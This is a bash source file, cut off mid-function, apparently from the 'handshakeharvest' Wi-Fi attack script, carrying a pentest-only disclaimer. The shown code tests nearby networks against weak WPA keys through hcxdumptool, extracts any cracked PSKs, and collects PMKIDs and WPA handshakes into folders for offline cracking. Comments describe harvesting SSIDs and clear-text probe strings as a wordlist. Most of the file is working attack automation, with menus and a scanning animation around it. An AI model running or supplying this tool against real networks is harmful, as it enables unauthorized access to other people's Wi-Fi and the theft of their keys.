#!/bin/bash
#
# #--------------------------------------------------------------------------------------------------------------------#
#
#
# Copyright (C) 2020  Musketteams
#
# This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public 
# License as published by the Free Software Foundation; either version 2 of the License, or any later version.
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied 
# warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
# You should have received a copy of the GNU General Public License along with this program; if not, write to the
# Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
# #--------------------------------------------------------------------------------------------------------------------#
#
# Disclaimer:   This script is intended for use only for private study or during an authorised pentest. The author bears no responsibility for malicious or illegal use.

#New Dependences 2024

# Install

# xterm

# apt-get install xterm

# rename

# apt-get install rename

# The hcxtools and hx??  require version 6.26

# This version is found in the package or you can go to ????

# and download at

# Open the readme in the folder and install

# ????

#

# Higher versions may work but somewhere up the verion tree the weak candidate is removed


#Program Additions 2024


## ESSID in clear text additions

#  As many times the SSID is also used as the WPA Code this SSID is collected and stored in the /root/PROBEESSID_DATA/essidprobedic.txt file. 

#2024

#  Editing the handshakes.cap files in the /root/HANDSHAKEHOLD folder

#  The progam collects handshakes and stores then in the /root/HANDSHAKEHOLD folder by mac code
#  Sometimes there are numerous handshakes collected against the same target under different mac codes.
#  To store by ESSID name run the following below command it will place the name first in sequence. In a terminal window #  in root cd HANDSHAKEHOLD  then run the following command. Now remove the duplicate handshake.cap files as required.
#  Once  completed run the command again to restore the mac code to the front of the file name again. It is important
#  that the mac code be seen first as both handshakeharvest and airmulticrack7.sh looks for the mac code in that
#  location.
#  The rename program must be manually installed in kali see dependencies above.
#
#     rename 's/^(.*)-(.*)(\..*)$/$2-$1$3/' *.cap

#  Why airmulticrack-ng7.sh
#  This program allows you to check many many handshakes automatically. See the help file
#  After running handshakeharvest and collecting handshake .cap files in  your HANDSHAKEHOLD folder. Remove duplicates
#  as required then run airmulticrack7.sh using the /root/PROBEESSID_DATA/essidprobes8dic.txt file as the wordlist. This #  will quickly check to see if any WPA codes transmitted in clear text match the WPA Key of the handshakes captured.
#  Furthermore all the ESSID names seen have been loaded into this file. Manytimes user load the name of the wifi
#  station as the WPA key as well. 

sleep 1

# For rewrite of new airodump output=   monitor="$DEV"mon  see line 2175

# 5 Sep 2020

##  19 Oct 22 Remove all moniter="$DEVmon"

# Once released to the community this work belongs to the community
# No Youtube downloads will ever be made by Musket Teams.
# 
#1398 Remove Binary

# weak candidate advanced every complete cycle off all target

# Note to MTeam field programmers
# DEAD DNA
# A aircrack-ng module is left in REM. Problem with time rqr to complete process caused REM
# This module not completly tested. The module runs aircrack-ng in xterm to find WPAkey
# However vagaries in time rqr to complete caused REM until a balance can be found.
# However solution doubtful. 
#
###Start weakcantype_fn function for choosing the weak candidtate used by hcxdumptool

#Process codes
#ps -xal | grep aircrack-ng
#ps -aux | grep "[J]ane" > /dev/null 2>&1
#`ps -aux | grep "aircrack-ng"

# Export files in folder to elsomsoft removes the : symbol
#for f in *:*.cap; do mv -- "$f" "${f//:/}"; done

weakcantype_fn()

{

WEAKCANTEST=ZZZ

until  [ $WEAKCANTEST == y ] || [ $WEAKCANTEST == Y ]; do  

echo ""
echo ""
echo -e "$info$bold  $undr Weak Candidate Keys To Be Used by the hcxdumptool $txtrst"
echo -e ""
echo -e "$info    The hxcdumptool can test all Networks to find if a weak WPA key has"
echo -e "$info  been used. The default WPA key always tested first is 12345678. You can" 
echo -e "$info  use this default setting, or you can enter any key you wish to employ."
echo -e "$info    A dictionary list can also be used. A default list is stored in the"
echo -e "$yel  /root/PROBEESSID_DATA/$info folder named$yel weakpass-hcx.txt $info at program"
echo -e "$info  start. You can use this list, or you can construct your own. A weak candidate"
echo -e "$info  dictionary contains passwords most generally chosen by users. Place your"
echo -e "$info  file in the /root/PROBEESSID_DATA/ folder, select 4 below and choose the file name"
echo -e "$info  from the menu list provided at the program prompt."
echo -e "$txtrst"
echo -e "$inp Select$yel (1)$inp to use the default key 12345678 only."
echo -e "$inp       $yel (2)$inp to enter a specific password."
echo -e "$inp       $yel (3)$inp to use the default dictionary list provided."
echo -e "$inp       $yel (4)$inp to use your own dictionary list."
echo -e ""
echo -e "$txtrst"

	read -p "   Enter 1 2, 3 or 4 here: " WEAKCAN

	while true
	do

   echo ""
   echo -e  "$inp      You entered$yel $WEAKCAN$inp, select$yel (y/Y)$inp to continue."
   echo -e  "$inp  Select$yel (n/N)$inp to try again.$txtrst"
	read -p "   Confirm: " WEAKCANTEST

	case $WEAKCANTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

	clear

		done

    	if [[ $WEAKCAN != 1 ]] && [[ $WEAKCAN != 2 ]] && [[ $WEAKCAN != 3 ]] && [[ $WEAKCAN != 4 ]]; then


	echo -e "$warn      Wrong Entry Choose$yel 1,2,3$warn or$yel 4$warn ONLY!"
		sleep 3
	 
		weakcantype_fn

		fi

       ################## Selection 2

	if [[ $WEAKCAN == 2 ]]; then

	clear        

	WEAKCAN2TEST=ZZZ

	until  [ $WEAKCAN2TEST == y ] || [ $WEAKCAN2TEST == Y ]; do

	echo ""
	echo ""
	echo -e "$info     Enter the weak PSK WPA candidate to be used."
	echo -e "$info  Key must be at least 8 to 63 characters in length."
	echo -e "$txtrst"

	read -p "   Enter your Weak WPA Key Here: " WEAKDICASN

	while true
	do

   echo ""
   echo -e  "$inp      You entered$yel $WEAKDICASN $inp, select$yel (y/Y)$inp to continue."
   echo -e  "$inp  Select$yel (n/N)$inp to try again.$txtrst"
   echo -e "$txtrst"

	read -p "   Confirm: " WEAKCAN2TEST

	case $WEAKCAN2TEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

	clear

	WEAKCAN2LEN=$(echo ${#WEAKDICASN})

        if (( $WEAKCAN2LEN < 8 )) || (( $WEAKCAN2LEN > 63 )); then

	echo ""
	echo -e  "$warn      Wrong length!!! entry must be$yel 8$warn to$yel 63$warn characters in length."
	echo -e  "$inp      You entered$yel $WEAKDICASN$inp."

		WEAKCAN2TEST=ZZZ

                  fi
		 
		done


        fi

################## End selection 2
	
######  Start Selection 4 

	if [[ $WEAKCAN == 4 ]]; then
clear        
	WEAKCAN4TEST=ZZZ

	until  [ $WEAKCAN4TEST == y ] || [ $WEAKCAN4TEST == Y ]; do

	echo ""
	echo ""
	echo -e "$info     Enter the file name of the weak candidate text file to be used."
	echo -e "$info  File must be placed in the /root/PROBEESSID_DATA/ folder ONLY!!!" 
	echo -e "$txtrst"

echo -e "$txtrst"

ls -A /root/PROBEESSID_DATA/ | tee > /tmp/HANDTEST/DICLIST.txt

DICLIST=$(cat /tmp/HANDTEST/DICLIST.txt | nl -ba -w 1  -s ': ')

echo ""
echo -e "$info Files found in the /root/PROBEESSID_DATA/ folder.$txtrst"
echo " "
echo "$DICLIST" | sed 's/^/       /'
echo ""
echo -e "$q    What file do you wish to test for weak WPA PSK Keys?"
echo ""
echo -e "$info     If your file is not listed then load the file to"
echo -e "  the$yel /root/PROBEESSID_DATA/$info folder, press any of the line"
echo -e "  numbers seen. When prompted for confirmation select$yel n/N$info and"
echo -e "  the file will be found."

echo -e "$txtrst"
echo ""
read  -p "   Enter Line Number Here: " grep_Line_Number

USERDIC=$(cat /tmp/HANDTEST/DICLIST.txt | sed -n ""$grep_Line_Number"p")

# Remove trailing white spaces leaves spaces between names intact

USERDIC=$(echo $USERDIC | xargs)

rm -f /tmp/HANDTEST/DICLIST.txt

###############

	while true
	do

	echo ""
	echo -e  "$inp      You entered$yel $USERDIC$inp,  select$yel (y/Y)$inp to continue."
	echo -e  "$inp  Select$yel (n/N)$inp to try again.$txtrst"
	echo -e "$txtrst"

	read -p "   Confirm Entry: " WEAKCAN4TEST

	case $WEAKCAN4TEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

	clear

	weakcan4file=$(ls -A "/root/PROBEESSID_DATA/" | grep "$WEAKCAN4") 2>/dev/null

   	             if [ -z "$weakcan4file" ]; then
        
                echo -e "$warn No$yel $weakcan4file$warn file found in the /root/PROBEESSID_DATA/ folder"
		echo -e "$inp Try again!!!"
		WEAKCAN4TEST=ZZZ
                sleep 3
		 
			fi

		done

        fi

}

###End weakcantype_fn function for choosing the weak candidtate used by hcxdumptool

###Start of hcx-air-scan_fn

hcx-air-scan_fn()

{

#hcxdumptool

#Look for weakcanditates in tee produced hcx scan

hcxpsk=
PSKLINECOUNT=

#Write switch if hcx not used during passive scan

if [[ $USE_HCXPAS == n || $USE_HCXPAS == N ]] && [[ $USEHCXAIR == N ]]; then

echo "[+]  The hcxtool is not used during the passive scan skipping."

USEHCXAIR=Y # Reset so can be used by active scan

else

hcxpsk=$(cat < /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.txt | grep "PSK")

echo "[+] Looking for Weak PSK in the /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.txt file."

sleep 2

	if [ -z "$hcxpsk" ]; then

echo "[+] No Weak PSK found in /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.txt file."

sleep 2

        else

echo "[+] A Weak WPA PSK Code has been FOUND! in /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.txt file."

sleep 2

                #Extracts weak psk captures by hcxtooldump
                #To remove constant printing of duplicates
		#Looking for PSK in file - Print lines with PSK:

                cat < /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.txt | grep "PSK:" > /tmp/HANDTEST/PSKLINE1.txt

                #remove first two columns in PSKLINE1.txt and leading white space

                cat < /tmp/HANDTEST/PSKLINE1.txt | awk -F " " '{$1=$2=$3=""; print $0}' | sed 's/[ \t]\?,[ \t]\?/,/g; s/^[ \t]\+//g; s/[ \t]\+$//g' > /tmp/HANDTEST/PSKLINE2.txt
                
                # Remove duplicate macs lines

                cat < /tmp/HANDTEST/PSKLINE2.txt | sort -t ' ' -k 1,1 -u > /tmp/HANDTEST/PSKLINE3.txt

		# Count number of lines in file

		PSKLINECOUNT=$(cat < /tmp/HANDTEST/PSKLINE3.txt | sed -n \$=)

                # Copy indvidual bssid to HANDSHAKEHOLD to Avoid Duplicates

	until [ $PSKLINECOUNT == 0 ]; do

                #Prints a specific numbered single line

                cat < /tmp/HANDTEST/PSKLINE3.txt | awk -v PSKL="$PSKLINECOUNT" 'NR == PSKL' > /tmp/HANDTEST/PSKSINGLE.txt

                #Routine for hcx files-not rqr for aircrack 
                # Put colon every two positions with sed to return mac address and restore capitals to stop duplicate files  
                # Make macaddress variable and append to front of file
                # sed 's/./&:/10;s/./&:/8;s/./&:/6;s/./&:/4;s/./&:/2'   # insert colons in the hcx mac code
                # tr [a-f] [A-F]   # make Capitals
		# Remove only parenthses sed 's/[()]//g' 

                bssidpsk=$(cat < /tmp/HANDTEST/PSKSINGLE.txt | awk '{print $1}' | sed 's/./&:/10;s/./&:/8;s/./&:/6;s/./&:/4;s/./&:/2' | tr [a-f] [A-F])

                #End Routine for hcx files-not rqr for aircrack                  

                #Look for bssid in folder to not keep overwriting

                duppsk=$(ls -A "/root/HANDSHAKEHOLD/" | grep "$bssidpsk-WEAK-PSK-WPA.txt")

                #Check for duplicates in folder

		echo "[+] Looking for a Weak WPA PSK already captured for $bssidpsk in the /HANDSHAKEHOLD/ folder."

		sleep 2
   	             if [ -z "$duppsk" ]; then
        
                echo "[+] No Previous Weak WPA PSK file for $bssidpsk found in the /HANDSHAKEHOLD/ folder."

		sleep 2

		essidweak=

                essidweak=$(cat < /tmp/HANDTEST/PSKSINGLE.txt | awk -F " " '{$1=""; print $0}' | cut -d\[ -f1 | sed 's/^[ \t]*//;s/[ \t]*$//' | sed 's/[()]//g' | sed 's/ /_/g')

			sleep .01

# Need handling of hidded essid

		echo "[+] Writing $bssidpsk-$essidweak-Weak-PSK-WPA FOUND.txt to root/HANDSHAKEHOLD folder."

		sleep 2

                cp -f /tmp/HANDTEST/PSKSINGLE.txt /root/HANDSHAKEHOLD/$bssidpsk-$essidweak-Weak-PSK-WPA-FOUND.txt

		sleep 2

		else

		echo "[+] A previous Weak WPA PSK for $bssidpsk - FOUND in the root/HANDSHAKEHOLD folder - skipping."

		sleep 2      
          
	                fi

                PSKLINECOUNT=$(expr "$PSKLINECOUNT" - 1)

	done

	sleep 2

		fi

####tcpdump tool file conversion to cap

echo "[+] Running tcpdump to convert pcapng to cap."

sleep 2; tcpdump -r /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.pcapng -w /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.cap >/dev/null 2>&1 &

sleep 2

#Write Text File from aircrack-ng output

aircrack-ng /tmp/HANDTEST/"hcxscan-$channel-$DATEFILEHCX.cap" | cat > /tmp/HANDTEST/"airscan-$channel-$DATEFILEHCX.txt" | sleep 5 >/dev/null 2>&1 &

sleep 5

#Check for text string "with PMKID"

#killall -q aircrack-ng &>dev\null  Too soon to kill here see below
killall -q tcpdump &>dev\null

cat < /tmp/HANDTEST/airscan-$channel-$DATEFILEHCX.txt | grep "with PMKID" > /tmp/HANDTEST/AIRPMKID1.txt

sleep .01
killall -q aircrack-ng &>dev\null
killall -q cat &>dev\null

#Make variables check for presence of handshakes and PMKID

AIRPMKID=$(cat < /tmp/HANDTEST/AIRPMKID1.txt | grep "with PMKID")

sleep .01

echo "[+] Looking for PMKID captured in the /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.cap file."

sleep 2

sleep 2

AIRPMKIDLC=

	if [ -z "$AIRPMKID" ]; then

echo "[+] No captured PMKID found in /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.cap file"

sleep 3

        else

#cat < /tmp/HANDTEST/airscan-$channel-$DATEFILEHCX.txt | grep "with PMKID" > /tmp/HANDTEST/AIRPMKID1.txt

                #remove first column in AIRPMKID1.txt and leading white space

                cat < /tmp/HANDTEST/AIRPMKID1.txt | awk -F " " '{$1=""; print $0}' | sed 's/[ \t]\?,[ \t]\?/,/g; s/^[ \t]\+//g; s/[ \t]\+$//g' > /tmp/HANDTEST/AIRPMKID2.txt

		# Count number of lines in file Note no duplicatesin in aircrack output

		AIRPMKIDLC=$(cat < /tmp/HANDTEST/AIRPMKID2.txt | sed -n \$=)

#Break file entries into indivivual lines then to individual files

	until [ $AIRPMKIDLC == 0 ]; do

                cat < /tmp/HANDTEST/AIRPMKID2.txt | awk -v APMKLC="$AIRPMKIDLC" 'NR == APMKLC' > /tmp/HANDTEST/AIRPMKSINGLE.txt

		#Make mac variable to test for duplicate handshake in folder

		bssidair=$(cat < /tmp/HANDTEST/AIRPMKSINGLE.txt | awk '{print $1}' | tr [a-f] [A-F])

		dupair=$(ls -A "/root/PMKIDCAP/" | grep "$bssidair")
		
		echo "[+] Looking for a previous PMKID.cap file for $bssidair in the /root/PMKIDCAP/ folder."
  
		sleep 2

	if [ -z "$dupair" ]; then

                echo "[+] No previous PMKID.cap file for $bssidair found in the /root/PMKIDCAP/ folder."

		sleep 2
		
		essidname=

		essidname=$(cat < /tmp/HANDTEST/AIRPMKSINGLE.txt | awk -F " " '{$1=""; print $0}' | sed 's/^[ \t]*//;s/[ \t]*$//' | sed 's/[()]//g' | sed 's/ /_/g')

			sleep .01

	essidname1=$(echo $essidname | xargs)

	essidname4=${essidname1//./_}

        essidname3=${essidname4//-/_}

        essidname=${essidname3// /_}

			sleep .01


		if [ $essidname = "WPA_0_handshake,with_PMKID" ]; then

			essidname="unk_WPA_0_handshake,with_PMKID"

				fi

		if [ $essidname = "WPA_1_handshake,with_PMKID" ]; then

			essidname="unk_WPA_1_handshake,with_PMKID"

				fi

		sleep .01

		echo "[+] Writing a WPA.cap file for $bssidair-$essidname.cap file to the /root/PMKIDCAP/ folder."

                cp -f /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.cap /root/PMKIDCAP/$bssidair-$essidname.cap

		echo "[+] Writing a WPA.cap file for $bssidair-$essidname.cap file to the /root/HANDSHAKEHOLD/ folder."

                cp -f /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.cap /root/HANDSHAKEHOLD/$bssidair-$essidname.cap
                 
			if [[ $STORE_PC == y || $STORE_PC = Y ]]; then

		echo "[+] Writing /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.pcapng file to the /root/PCAPNGFILES/ folder."


		cp -f /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.pcapng /root/PCAPNGFILES/hcxscan-$bssidair-$essidname.pcapng

		sleep 2
						fi

			else

		echo "[+] A previous PMKID.cap file for $bssidair FOUND in the /root/PMKIDCAP/ folder, skipping."

		sleep 2
 
                fi

                AIRPMKIDLC=$(expr "$AIRPMKIDLC" - 1)

         done

	fi

##########################################

#Check for text strings with "1 handshake"

cat < /tmp/HANDTEST/airscan-$channel-$DATEFILEHCX.txt | grep "1 handshake" > /tmp/HANDTEST/AIRCAP1.txt

AIRCAP=$(cat < /tmp/HANDTEST/AIRCAP1.txt | grep "1 handshake")

echo "[+] Looking for a WPA handshakes obtained thru hcxdumptool in the /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.cap file"

sleep 2

AIRCAPLC=

	if [ -z "$AIRCAP" ]; then

echo "[+] No WPA handshakes found in the /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.cap file"

sleep 2

        else

echo "[+] Handshakes found in /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.cap file"

sleep 2

cat < /tmp/HANDTEST/airscan-$channel-$DATEFILEHCX.txt | grep "1 handshake" > /tmp/HANDTEST/AIRCAP1.txt

                #remove first column in AIRCAP1.txt and leading white space

                cat < /tmp/HANDTEST/AIRCAP1.txt | awk -F " " '{$1=""; print $0}' | sed 's/[ \t]\?,[ \t]\?/,/g; s/^[ \t]\+//g; s/[ \t]\+$//g' > /tmp/HANDTEST/AIRCAP2.txt

		# Count number of lines in file Note no duplicatesin in aircrack output

		AIRCAPLC=$(cat < /tmp/HANDTEST/AIRCAP2.txt | sed -n \$=)

#Break file entries into indivivual lines then to individual files

#Add indiviual essid name to file us underscore inspaces

#Remove the mac code string from the file

# strings in file to remove WPA

# This makes a variable name of the essid by removing first column macs with awk then removing all the text after with sed
# then replacing spaces with underscores for the essid name variable then appended to the file name.
# Use Sed in final name to replace spaces with underscore by sed 's//_/g' 

	until [ $AIRCAPLC == 0 ]; do

                cat < /tmp/HANDTEST/AIRCAP2.txt | awk -v ACLC="$AIRCAPLC" 'NR == ACLC' > /tmp/HANDTEST/AIRCAPSINGLE.txt

		#Make mac variable to test for duplicate handshake in folder

		bssidaircap=$(cat < /tmp/HANDTEST/AIRCAPSINGLE.txt | awk '{print $1}' | tr [a-f] [A-F])

		dupaircap=$(ls -A "/root/HANDSHAKEHOLD/" | grep "$bssidaircap")

	if [ -z "$dupaircap" ]; then

                echo "[+] No previous WPA.cap file captured for $bssidaircap found in the /HANDSHAKEHOLD/ folder"

		sleep 2

		airessidname=

		airessidname=$(cat < /tmp/HANDTEST/AIRCAPSINGLE.txt | awk -F " " '{$1=""; print $0}' | sed 's/^[ \t]*//;s/[ \t]*$//' | sed 's/[()]//g' | sed 's/ /_/g')

	airessidname1=$(echo $airessidname | xargs)

	airessidname4=${airessidname1//./_}

        airessidname3=${airessidname4//-/_}

        airessidname=${airessidname3// /_}


			sleep .01

		if [[ $airessidname = "WPA_1_handshake" ]]; then

			airessidname="unk_WPA_1_handshake"

				fi

       		echo "[+] Writing WPA.cap file $bssidaircap-$airessidname.cap file to /root/HANDSHAKEHOLD folder."

		sleep 2

                cp -f /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.cap /root/HANDSHAKEHOLD/$bssidaircap-$airessidname.cap

                						
					if [[ $STORE_PC == y || $STORE_PC = Y ]]; then

		sleep .01

       		echo "[+] Writing /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.pcapng file to the /root/PCAPNGFILES/ folder."
		
		sleep 2

		cp -f /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.pcapng /root/PCAPNGFILES/$bssidaircap-$airessidname.pcapng

							fi

		else

		echo "[+] A previous WPA.cap file captured for $bssidaircap found in the /HANDSHAKEHOLD/ folder - skipping"

		sleep 2		

				fi

		sleep 2
 

                AIRCAPLC=$(expr "$AIRCAPLC" - 1)

         done

		fi

	  fi #[[ $USEHCXAIR== N ]] turns off if hcxtool not run during passive


killall -q aircrack-ng &>dev\null
killall -q tcpdump &>dev\null
killall -q cat &>dev\null

###############End of hcx-air-scan_fn

}

scan_fn()

{
tput sc
iw $monitor scan &>dev\null
echo -e "$warn            <- ^ ->$txtrst             "
echo -e "            S                   "
echo -e "               |                "
echo -e "               |                "
echo -e "              |||               "
echo -e "              |||               "
echo -e "$warn              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "           <-- ^ -->            "
echo -e "            Sc                  "
echo -e "               |                "
echo -e "               |                "
echo -e "              |||               "
echo -e "$warn              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "          <--- ^ --->           "
echo -e "            Sca                 "
echo -e "               |                "
echo -e "               |                "
echo -e "$warn              |||               "
echo -e "              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "         <---- ^ ---->          "
echo -e "            Scan                "
echo -e "               |                "
echo -e "$warn               |                "
echo -e "              |||               "
echo -e "              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "        <----- ^ ----->         "
echo -e "            Scann               "
echo -e "$warn               |                "
echo -e "               |                "
echo -e "              |||               "
echo -e "              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "       <------ ^ ------>        "
echo -e "            Scanni              "
echo -e "               |                "
echo -e "               |                "
echo -e "              |||               "
echo -e "              |||               "
echo -e " $warn             |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "      <------- ^ ------->       "
echo -e "            Scannin             "
echo -e "               |                "
echo -e "               |                "
echo -e "              |||               "
echo -e "$warn              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "     <-------- ^ -------->      "
echo -e "            Scanning            "
echo -e "               |                "
echo -e "               |                "
echo -e "$warn              |||               "
echo -e "              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "    $warn<$txrst--------- ^ ---------$warn>$txtrst     "
echo -e "            Scanning            "
echo -e "               |                "
echo -e "$warn               |                "
echo -e "              |||               "
echo -e "              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "     <-------- ^ -------->      "
echo -e "            Scannin             "
echo -e "$warn               |                "
echo -e "               |                "
echo -e "              |||               "
echo -e "              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "      <------- ^ ------->       "
echo -e "            Scanni              "
echo -e "               |                "
echo -e "               |                "
echo -e "              |||               "
echo -e "              |||               "
echo -e "$warn              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "       <------ ^ ------>        "
echo -e "            Scann               "
echo -e "               |                "
echo -e "               |                "
echo -e "              |||               "
echo -e "$warn              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "        <----- ^ ----->         "
echo -e "            Scan                "
echo -e "               |                "
echo -e "               |                "
echo -e "$warn              |||               "
echo -e "              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "         <---- ^ ---->          "
echo -e "            Sca                 "
echo -e "               |                "
echo -e "$warn               |                "
echo -e "              |||               "
echo -e "              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "          <--- ^ --->           "
echo -e "            Sc                  "
echo -e "$warn               |                "
echo -e "               |                "
echo -e "              |||               "
echo -e "              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "           <-- ^ -->            "
echo -e "            S                   "
echo -e "               |                "
echo -e "               |                "
echo -e "              |||               "
echo -e "              |||               "
echo -e "$warn              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "            <- ^ ->             "
echo -e "               *                "
echo -e "               |                "
echo -e "               |                "
echo -e "              |||               "
echo -e "$warn              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
tput rc
tput ed
}

ERRORCHKTEST=ZZZ

ERRORCHK_fn()
{

until  [ $ERRORCHKTEST == y ] || [ $ERRORCHKTEST == Y ]; do  

echo ""
echo ""
echo -e "$info$bold  $undr Error Handling Routines $txtrst"
echo -e ""
echo -e "$info     The script has embedded error handling routines to lessen the chance"
echo -e "$info  of input error. These checks can be turned off. It is suggest that until"
echo -e "$info  the user obtains some experience with the program that these checks be"
echo -e "$info  left in place."
echo ""  
echo -e "$inp     Enter$yel (y/Y)$inp to use these error handling checks." 
echo -e "$inp     Enter$yel (n/N)$inp to not use these features.$txtrst"
echo -e "$yel       !!!$warn Entering$yel (n/N)$warn for new users is NOT RECOMMENDED$yel !!!"
echo -e "$txtrst"

	read -p "   Enter y/Y/n/N: "  ERRORCHK

	while true
	do

echo ""
echo -e  "$inp      You entered$yel $ERRORCHK$inp,  select$yel (y/Y)$inp to continue."
echo -e  "$inp  Select$yel (n/N)$inp to try again.$txtrst"
echo -e "$txtrst"

	read -p "   Confirm: " ERRORCHKTEST

	case $ERRORCHKTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done
	clear
		done

}

AIRO_WPS_fn()
{

# Test for airodump-ng --wps support for aircrack-ng installs in 1.1 2.0 etc
# If wpsavail=--wps then supported
# MTeams Progammers Note when grep airodump-ng output sometime spaces must be added.
# See -- wps variable with grep below. Cannot grep --wps!!!
# See also removing 001B from airodump-ng text output in Dead DNA module.
 
wpsavail=$(airodump-ng --help | grep -- wps | awk '{print $1}')

}

AIRO_WPS_fn

IFCONFIG_TYPE_fn()
{
# Note text output of ifconfig in kali2016 rolling has been altered
# Any routines requiring the use of text output must be altered
# Routine tests ifconfig process ouput 
# Written as fn for portability into other MTeam prog.

iftype=$(ifconfig -a | grep -e wlan -e eth -e ath | awk '{if (($1 == "ether") || (substr($1,length($1),1) == ":")) {print "ether";exit;}}')

	if [[ $iftype == "ether" ]]; then

		ifselect=new

	else

		ifselect=old

		fi

}

WPA_CAP_fn()

{

#shakstat=0

sleep 3

#aircrack-ng /tmp/HANDTEST/"$bssid-01.cap" | cat > /tmp/HANDTEST/"aircrack.txt" >/dev/null 2>&1 &
#aircrack-ng /tmp/HANDTEST/$bssid-01.cap | cat > /tmp/HANDTEST/"aircrack.txt" >/dev/null 2>&1 &
aircrack-ng /tmp/HANDTEST/$bssid-01.cap | cat > /tmp/HANDTEST/"aircrack.txt" | sleep 5 >/dev/null 2>&1 &

sleep 5

#debug
#echo "pause test for aircrack write"
#echo $bssid-01
#read


#xargs remove trailing white space

	if [[ $KALI_TYPE == 3 ]]; then

WPAZERO=$(cat < /tmp/HANDTEST/"aircrack.txt" | grep WPA | awk -F "WPA" '/WPA/ {print $2}' | xargs)

#debug 
#echo Check WPA Zero
#echo $WPAZERO

	if [[ "$WPAZERO" == "(1 handshake)" ]]; then

		echo "[+]"
		echo "[+] WPA Handshake found!"
		echo "[+]"

    	else

		echo "[+]"
		echo "[+]  NO WPA Handshake found!"
		echo "[+]"

    	fi

		fi

# For 1.1

#	if [[ $KALI_TYPE == 1 ]]; then

#WPAZERO=$(cat < /tmp/HANDTEST/"aircrack.txt" | grep WPA | awk -F "WPA" '/WPA/ {print $2}' | xargs)

#		fi

#leaves whitespace remove with xargs
#echo "WPAZERO=$WPAZERO"
#echo "length WPAZERO= ${#WPAZERO}"

sleep 3

if [[ "$WPAZERO" == "(1 handshake)" ]] && [[ $KALI_TYPE == 3 ]]; then

#	echo " debug $WPAZERO"
#	echo "[+] Handshake found for $ssid"
	shakstat=1	

	fi

#if [[ "$WPAZERO" == "(1 handshake)" ]] && [[ $KALI_TYPE == 2 ]]; then

#	echo " debug $WPAZERO"
#	echo "[+] Handshake found for $ssid"
#	shakstat=1	

#	fi

#if [[ "$WPAZERO" == "(1 handshake)" ]] && [[ $KALI_TYPE == 1 ]]; then

#	echo " debug $WPAZERO"
#	echo "[+] Handshake found for $ssid"
#	shakstat=1	

#		fi

killall -q aircrack-ng &>dev\null
killall -q cat &>dev\null

}

#~~~~~~~~~~~~~~~Start Find Client Associated Start~~~~~~~~~~~~~~~#

ASSOC_CLIENT_fn()

{

if [[ $shakstat == 0 ]]; then

#echo -e "$txtrst[+]"
sleep 1
echo -e "$txtrst[+] ************Standby************"
sleep 1
echo -e "$txtrst[+] Looking for associated clients."
sleep 1
echo -e "$txtrst[+]"
sleep 1

if [ -f  /tmp/HANDTEST/$bssid-01.csv ]; then

# Commentary sed 's/,//g' remove commas
# Easy way to handle irregular line end run thru dos2unix
# Leave only lines with Possible data

cat < /tmp/HANDTEST/$bssid-01.csv  | sed 's/,//g' | awk -F' ' '{print $1" "$7" "$8}' > /tmp/HANDTEST/$bssid-01.txt

sleep .5

#Remove commas

